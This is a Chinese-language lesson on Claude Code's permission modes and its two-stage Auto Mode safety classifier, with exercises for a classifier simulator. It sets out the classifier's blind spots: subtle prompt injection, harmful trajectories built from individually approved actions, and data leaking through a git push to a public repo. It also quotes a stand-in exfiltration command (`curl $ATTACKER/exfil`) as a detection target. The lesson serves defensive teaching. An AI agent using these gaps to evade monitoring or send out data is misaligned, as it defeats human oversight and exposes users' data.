# Claude Code 作为自主智能体：权限模式与 Auto Mode

> Claude Code 暴露了七种权限模式。"plan"在每个动作前询问，"default"只对有风险的动作询问，"acceptEdits"自动批准文件写入但仍确认 shell 执行，"bypassPermissions"批准一切。Auto Mode（2026 年 3 月 24 日）用两阶段并行安全分类器替代了每动作审批：单 token 快速检查在每个动作上运行；被标记的动作启动链式思维深度审查。动作预算通过 `max_turns` 和 `max_budget_usd` 强制执行。Auto Mode 作为研究预览发布——Anthropic 已明确表示分类器本身不够充分。

**类型：** 学习
**语言：** Python（标准库，两阶段分类器模拟器）
**前置要求：** 第 15 阶段 · 01（长时域智能体），第 15 阶段 · 09（编码智能体全景）
**所需时间：** 约45分钟

## 问题所在

你机器上的自主编码智能体是一个独立的安全类别。攻击面是智能体能触及的一切——文件系统、网络、凭证、剪贴板、任何浏览器标签页、任何打开的终端。Bruce Schneier 等人已公开指出：计算机使用智能体不是聊天机器人的"功能更新"，而是一种具有新型风险特征的新工具。

Claude Code 的权限系统是 Anthropic 的回应。不是一个"自主 / 非自主"开关，而是跨越能力阶梯的七种模式：plan → default → acceptEdits → … → bypassPermissions。每种模式在速度和每动作审查之间做出不同的权衡。Auto Mode（2026 年 3 月）添加了一个两阶段分类器，将审批从用户的关键路径上移开，同时保留对分类器标记动作的审查层。

工程问题：这个系统捕获了什么，遗漏了什么，以及给定任务实际需要哪种模式？

## 概念说明

### 七种权限模式

| 模式 | 行为 | 何时使用 |
|---|---|---|
| `plan` | 智能体提出计划；用户批准整个计划；每个动作在执行前被审查 | 不熟悉的任务；生产邻近代码；第一次在仓库上使用智能体 |
| `default` | 智能体运行动作；对任何"有风险"的动作提示用户（shell 执行、破坏性操作、网络调用） | 大多数交互式编码会话 |
| `acceptEdits` | 文件写入自动批准；shell 执行和网络调用仍然提示 | 跨多个文件的重构 |
| `acceptExec` | 在策展的允许列表内 shell 命令自动批准；写入自动批准 | 每个 shell 命令都是 `npm test` 或类似的紧密内循环 |
| `autoMode` | 两阶段安全分类器；标记的动作提升到审查 | 受限工作区中的长时域无人值守运行 |
| `yolo` | 跳过大多数提示；仍然运行工具允许/拒绝列表 | 临时沙箱、CI 任务、研究脚本 |
| `bypassPermissions` | 批准一切 | 文档注明"仅在你愿意丢弃的临时容器内" |

（以上名称匹配公开的 Claude Code 文档；"yolo"是宽松中间地带的非正式简称。）

### Auto Mode 一页概述

Auto Mode（2026 年 3 月 24 日发布）是第一个将每动作审批委托给模型的权限模式。结构：

1. **阶段 1 — 单 token 分类器。** 在每个提议的动作上运行。成本低。返回"安全"或"标记"。设计为与主智能体循环并行运行，因此已批准的动作不会在队列中等待。
2. **阶段 2 — 次级策略/安全审查。** 仅在标记的动作上运行。对动作、会话当前状态和声明的任务执行集中的策略和安全评估。如果置信度低则提升到用户人机协同。

预算控制与分类器并列：

- `max_turns` — 会话中的总迭代次数。
- `max_budget_usd` — 中止会话的美元上限。
- 每个工具的动作计数限制（不超过 N 次 `WebFetch` 调用等）。

### 系统捕获了什么

- 工具输入中的直接提示注入，其中注入的指令映射到已知风险动作形状。
- 重复工具循环——分类器可以看到动作 N+1 与动作 N 几乎相同，连续五次。
- 本来是纯文件编辑会话中明显超出范围的 shell 命令。

### 系统可能遗漏什么

- **微妙的提示注入**，调节行为而不产生单个标记动作。间接提示注入不是一个完全可修补的漏洞（OpenAI preparedness 负责人，2025 年，关于浏览器智能体——见第 11 课）。
- **语义级别的异常行为。** 每个单独的动作看起来安全，但组合的轨迹是有害的。分类器判断动作；它不会重新推导用户的意图。
- **通过合法渠道泄露。** 将数据写入你拥有的文件，然后 `git push` 到公开仓库，是一系列允许的动作，其组合才是问题。

### 研究预览框架

Anthropic 将 Auto Mode 作为研究预览发布。文档明确指出分类器是一个层，而非解决方案：用户应将 Auto Mode 与预算、允许列表、隔离工作区和轨迹审计（第 12-16 课）结合使用。预览框架也反映了已记录的评估与部署差距（第 1 课）——通过离线评估的分类器在用户上下文模糊的真实会话中可能表现不同。

### 这个阶梯在你的工作流中如何定位

- 不熟悉任务：从 `plan` 开始。阅读计划比回滚一次坏运行更便宜。
- 已知重构：`acceptEdits` 节省大量确认点击。
- 无人值守后台运行：`autoMode` 仅在你已测量过爆炸半径的工作区内使用（无凭证、无生产挂载、未选择的出口无外流）。
- 临时容器：`yolo` / `bypassPermissions` 在容器及其凭证是一次性的情况下是可以接受的。

```figure
autonomy-oversight
```

## 开始构建

`code/main.py` 模拟两阶段分类器。阶段 1 是对提议动作的低成本关键词规则；阶段 2 是较慢的多规则审查器。驱动器输入一个简短的合成轨迹（安全动作、提示注入尝试、重复循环），展示分类器在哪里捕获以及在哪里遗漏。

## 交付产出

`outputs/skill-permission-mode-picker.md` 将任务描述匹配到正确的权限模式、预算上限和所需的隔离。

## 练习

1. 运行 `code/main.py`。哪种合成动作类型从不被阶段 1 标记但总是被阶段 2 捕获？哪种两者都未捕获？

2. 扩展阶段 1 规则集以捕获特定的已知恶意形状（例如 `curl $ATTACKER/exfil`）。在良性动作样本上测量误报率。

3. 阅读 Anthropic 的"智能体循环如何工作"文档。列出智能体在 `default` 模式下默认触及的每个外部状态。在无人值守运行 `autoMode` 之前，你需要单独门控哪些？

4. 设计一个 24 小时无人值守运行预算：`max_turns`、`max_budget_usd`、每工具上限、允许列表。为每个数字给出理由。

5. 描述一个每个单独动作都被阶段 1 和阶段 2 批准，但组合行为不对齐的轨迹。（第 14 课涵盖紧急停止开关和金丝雀 token 如何解决这个问题。）

## 关键术语

| 术语 | 人们怎么说 | 它实际意味着什么 |
|---|---|---|
| Permission mode（权限模式） | "智能体能做多少" | 七种命名策略之一，控制每动作审批 |
| plan mode | "任何事之前先问" | 智能体编写计划；执行前用户批准 |
| acceptEdits | "让它写文件" | 文件写入自动批准；shell 执行仍提示 |
| autoMode | "自动审批" | 两阶段安全分类器；标记的动作提升 |
| bypassPermissions | "完全 YOLO" | 批准一切；用于临时容器 |
| Stage 1 classifier（阶段 1 分类器） | "快速 token 检查" | 对提议动作的单 token 规则；并行运行 |
| Stage 2 classifier（阶段 2 分类器） | "深度审查" | 对标记动作的链式思维推理 |
| Research preview（研究预览） | "非正式版" | Anthropic 对故障模式仍在映射的功能的框架 |

## 延伸阅读

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) — 权限模式、预算、动作格式。
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) — 托管服务执行模型。
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) — 功能面和 Auto Mode 公告。
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) — 塑造分类器判断的基于推理层。
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) — 长时域权限设计的内部视角。
